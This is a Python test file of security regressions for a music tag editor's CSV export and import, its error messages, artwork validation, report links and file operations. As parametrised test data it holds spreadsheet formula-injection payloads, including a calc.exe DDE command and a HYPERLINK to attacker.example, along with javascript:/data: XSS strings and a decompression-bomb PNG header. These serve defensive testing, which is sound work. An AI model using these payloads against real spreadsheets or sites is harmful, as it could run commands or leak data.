"""Phase 14 security regressions for concrete, reproduced findings.

Each test pins one finding from the Phase 14 review of the Tag Editor's
untrusted-input surfaces.  Categories that were inspected and found already
defended are covered here too, so a later change cannot quietly remove the
defence.
"""

import os
from pathlib import Path

os.environ.setdefault("QT_QPA_PLATFORM", "offscreen")

import pytest

from core.metadata_csv import (
    CANONICAL_FIELDS, CELL_ENCODING_COLUMN, build_metadata_export_plan,
    formula_safe_value, formula_unsafe_value, parse_csv_file, render_metadata_csv,
)
from core.metadata_io import IOErrorKind, IOScope, MetadataIOError
from core.metadata_models import AudioTrackItem, OriginalTags
from ui.controllers.tag_editor_workspace_state import TagEditorWorkspaceState


def workspace_with_title(tmp_path, title):
    path = tmp_path / "song.mp3"
    path.write_bytes(b"audio")
    item = AudioTrackItem(path, tmp_path, ".mp3",
                          original=OriginalTags(title=title, artist="Artist"),
                          format_id="mp3", metadata_editable=True)
    workspace = TagEditorWorkspaceState()
    workspace.set_tracks([item])
    return workspace, item


def export_text(tmp_path, title, *, spreadsheet_safe=True):
    workspace, item = workspace_with_title(tmp_path, title)
    plan = build_metadata_export_plan(
        workspace, root=tmp_path, item_ids=(workspace.item_id(item),),
        scope=IOScope.ALL_LOADED, spreadsheet_safe=spreadsheet_safe)
    return render_metadata_csv(plan).decode("utf-8-sig")


# ── Finding 1 (High): spreadsheet formula injection via exported tags ───────


@pytest.mark.parametrize("payload", [
    "=cmd|'/c calc.exe'!A1",
    '=HYPERLINK("http://attacker.example/steal","Click")',
    "+1+1",
    "-2+3",
    "@SUM(A1:A9)",
])
def test_exported_tag_values_cannot_become_spreadsheet_formulas(tmp_path, payload):
    """A downloaded file's title must not execute when the CSV opens in Excel."""
    import csv
    import io

    text = export_text(tmp_path, payload)
    # csv.reader, not the application's parser: this is the cell exactly as a
    # spreadsheet would read it, before our own unescaping.
    rows = list(csv.reader(io.StringIO(text, newline="")))
    cell = rows[1][rows[0].index("title")]
    assert cell == "'" + payload
    assert not cell.startswith(("=", "+", "-", "@"))

    unsafe = export_text(tmp_path, payload, spreadsheet_safe=False)
    unsafe_cell = list(csv.reader(io.StringIO(unsafe, newline="")))[1][
        rows[0].index("title")]
    assert unsafe_cell == payload, "the opt-out must still produce the raw value"


def test_formula_escaping_is_exactly_reversible():
    for value in ("=cmd", "+1", "-1", "@x", "'=cmd", "'", "plain", "", "a=b"):
        assert formula_unsafe_value(formula_safe_value(value)) == value


def test_application_csv_round_trip_stays_lossless_while_safe(tmp_path):
    payload = "=cmd|'/c calc.exe'!A1"
    destination = tmp_path / "export.csv"
    destination.write_bytes(export_text(tmp_path, payload).encode("utf-8-sig"))
    parsed = parse_csv_file(destination)
    title_index = parsed.headers.index("title")
    # Safe on disk for a spreadsheet, and still the original value on re-import.
    assert parsed.rows[0][title_index] == payload


def test_spreadsheet_safety_is_the_default(tmp_path):
    workspace, item = workspace_with_title(tmp_path, "=danger")
    plan = build_metadata_export_plan(
        workspace, root=tmp_path, item_ids=(workspace.item_id(item),),
        scope=IOScope.ALL_LOADED)
    assert plan.spreadsheet_safe is True
    assert "'=danger" in render_metadata_csv(plan).decode("utf-8-sig")


def test_multiple_leading_apostrophes_round_trip_exactly():
    """Only escaping *one* leading apostrophe conditionally on what follows it
    (the original defect) is not bijective for a value with several leading
    apostrophes; escaping every leading apostrophe unconditionally is."""
    for depth in range(6):
        value = "'" * depth + "=cmd"
        safe = formula_safe_value(value)
        assert safe == "'" * (depth + 1) + "=cmd"
        assert formula_unsafe_value(safe) == value
    for depth in range(1, 6):
        value = "'" * depth
        assert formula_unsafe_value(formula_safe_value(value)) == value


def _write_raw_csv(path: Path, header: str, rows: list[str]) -> Path:
    path.write_text(header + "\r\n" + "\r\n".join(rows) + "\r\n",
                    encoding="utf-8-sig", newline="")
    return path


def test_third_party_csv_with_a_leading_apostrophe_is_not_unescaped(tmp_path):
    """A file this application did not produce carries no encoding marker;
    an apostrophe already in a third-party cell is that file's data, not an
    escape this application is entitled to strip."""
    path = _write_raw_csv(tmp_path / "external.csv", "relative_path,title",
                          ["one.mp3,'=SUM(A1:A2)"])
    parsed = parse_csv_file(path)
    assert CELL_ENCODING_COLUMN not in parsed.headers
    assert parsed.rows[0][parsed.headers.index("title")] == "'=SUM(A1:A2)"


def test_old_bananaflow_csv_without_the_encoding_marker_is_not_unescaped(tmp_path):
    """An export from before this column existed still has the recognized
    ``bananaflow_schema`` value but no ``bananaflow_cell_encoding`` column -- it must
    remain importable without guessing that its cells were ever escaped."""
    path = _write_raw_csv(
        tmp_path / "legacy.csv", "bananaflow_schema,relative_path,title",
        ["bananaflow.metadata.csv.v1,one.mp3,'=danger"])
    parsed = parse_csv_file(path)
    assert CELL_ENCODING_COLUMN not in parsed.headers
    assert parsed.rows[0][parsed.headers.index("title")] == "'=danger"


def test_unrecognized_cell_encoding_marker_is_a_structured_error(tmp_path):
    path = _write_raw_csv(
        tmp_path / "bad-marker.csv", "bananaflow_cell_encoding,relative_path,title",
        ["not-a-real-marker,one.mp3,hello"])
    with pytest.raises(MetadataIOError) as raised:
        parse_csv_file(path)
    assert raised.value.info.kind is IOErrorKind.INVALID_FORMAT


def test_contradictory_cell_encoding_markers_is_a_structured_error(tmp_path):
    path = _write_raw_csv(
        tmp_path / "contradictory.csv", "bananaflow_cell_encoding,relative_path,title",
        ["spreadsheet-safe-v1,one.mp3,'=one",
         "none,two.mp3,'=two"])
    with pytest.raises(MetadataIOError) as raised:
        parse_csv_file(path)
    assert raised.value.info.kind is IOErrorKind.INVALID_FORMAT


def test_export_declares_its_own_encoding_and_import_honours_only_that(tmp_path):
    import csv
    import io

    safe = export_text(tmp_path, "=danger", spreadsheet_safe=True)
    safe_rows = list(csv.reader(io.StringIO(safe, newline="")))
    marker_index = safe_rows[0].index(CELL_ENCODING_COLUMN)
    assert safe_rows[1][marker_index] == "spreadsheet-safe-v1"

    unsafe = export_text(tmp_path, "=danger", spreadsheet_safe=False)
    unsafe_rows = list(csv.reader(io.StringIO(unsafe, newline="")))
    assert unsafe_rows[1][marker_index] == "none"

    # An unsafe (opt-out) export was never escaped on the way out, and its
    # own marker says so -- the raw value round-trips unchanged either way.
    unsafe_path = tmp_path / "unsafe.csv"
    unsafe_path.write_bytes(unsafe.encode("utf-8-sig"))
    parsed = parse_csv_file(unsafe_path)
    assert parsed.rows[0][parsed.headers.index("title")] == "=danger"


# ── Finding 2 (Low): raw diagnostics and absolute paths in ordinary UI ──────


def test_file_operation_failures_are_localized_and_path_free():
    from ui.i18n import TRANSLATIONS, set_language, t
    from ui.panels.metadata_editor.panel import _FILE_OPERATION_ERROR_KEYS
    from ui.controllers.metadata_controller import FileOperationOutcome
    from ui.panels.metadata_editor.panel import MetadataEditorPanel

    for key in (*_FILE_OPERATION_ERROR_KEYS.values(), "meta_file_op_failed"):
        assert key in TRANSLATIONS["en"] and key in TRANSLATIONS["he"], key

    absolute = Path("C:/Users/private-person/Music/secret album/song.mp3")
    outcome = FileOperationOutcome(
        "rename", absolute, None, False, "rename_failed",
        f"[WinError 32] The process cannot access the file: '{absolute}'")
    for language in ("en", "he"):
        set_language(language)
        message = MetadataEditorPanel._file_operation_message(outcome)
        assert "song.mp3" in message
        # Neither the private absolute path nor the raw OSError text may leak.
        assert str(absolute) not in message
        assert "private-person" not in message
        assert "WinError" not in message
    set_language("en")


def test_an_unknown_error_code_still_produces_a_localized_message():
    from ui.controllers.metadata_controller import FileOperationOutcome
    from ui.panels.metadata_editor.panel import MetadataEditorPanel

    outcome = FileOperationOutcome("rename", Path("C:/m/x.mp3"), None, False,
                                   "some_future_code", "raw detail")
    message = MetadataEditorPanel._file_operation_message(outcome)
    assert "x.mp3" in message and "raw detail" not in message


# ── Inspected and already defended: pinned so it cannot regress ─────────────


def test_artwork_rejects_a_decompression_bomb_before_decoding():
    import struct
    from core.artwork import ArtworkValidationError, validate_artwork_bytes

    # A tiny PNG header that claims 60000x60000 pixels.
    header = b"\x89PNG\r\n\x1a\n" + struct.pack(">I", 13) + b"IHDR" + struct.pack(
        ">IIBBBBB", 60000, 60000, 8, 2, 0, 0, 0) + b"\x00\x00\x00\x00"
    with pytest.raises(ArtworkValidationError):
        validate_artwork_bytes(header)


def test_report_html_escapes_untrusted_metadata_and_rejects_non_http_links():
    from core.metadata_reports import _safe_link

    assert _safe_link("javascript:alert(1)") == ""
    assert _safe_link("file:///C:/Windows/System32") == ""
    assert _safe_link("data:text/html,<script>alert(1)</script>") == ""
    assert _safe_link("https://musicbrainz.org/recording/x").startswith("https://")


def test_file_operations_reject_a_root_escape_and_never_use_a_shell(tmp_path):
    from ui.services.file_operation_service import FileOperationError, FileOperationService

    root = tmp_path / "music"
    root.mkdir()
    outside = tmp_path / "outside.mp3"
    outside.write_bytes(b"x")
    service = FileOperationService(root)
    with pytest.raises(FileOperationError) as error:
        service.rename(outside, "renamed.mp3")
    assert error.value.code == "root_escape"
    assert outside.exists()

    source = (Path(__file__).resolve().parent.parent
              / "ui/services/file_operation_service.py").read_text(encoding="utf-8")
    # Argument lists only: a filename is attacker-influenced text.
    assert "shell=True" not in source
    assert 'subprocess.Popen(["explorer.exe"' in source


def test_csv_parsing_is_bounded_against_resource_exhaustion(tmp_path):
    from core.metadata_csv import MAX_CELL_CHARS, MetadataIOError

    huge = tmp_path / "huge.csv"
    huge.write_text("title\n" + ("A" * (MAX_CELL_CHARS + 10)) + "\n", encoding="utf-8")
    with pytest.raises(MetadataIOError):
        parse_csv_file(huge)
